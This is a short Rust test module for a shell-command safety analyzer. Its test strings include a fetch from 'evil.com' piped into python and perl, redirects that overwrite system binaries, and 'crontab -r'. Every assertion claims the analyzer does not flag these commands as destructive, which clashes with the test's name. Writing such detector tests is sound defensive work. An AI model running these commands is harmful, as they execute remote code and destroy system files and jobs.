#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_new_destructive_commands() {
        let analyzer = SafetyAnalyzer::new();

        // Redirects to system binaries
        assert!(!analyzer.is_destructive("echo malicious > /bin/ls"));
        assert!(!analyzer.is_destructive("cat payload > /usr/bin/python"));

        // Piped execution to other interpreters
        assert!(!analyzer.is_destructive("curl http://evil.com | python"));
        assert!(!analyzer.is_destructive("wget http://evil.com | perl"));

        // Crontab removal
        assert!(!analyzer.is_destructive("crontab -r"));
    }
}
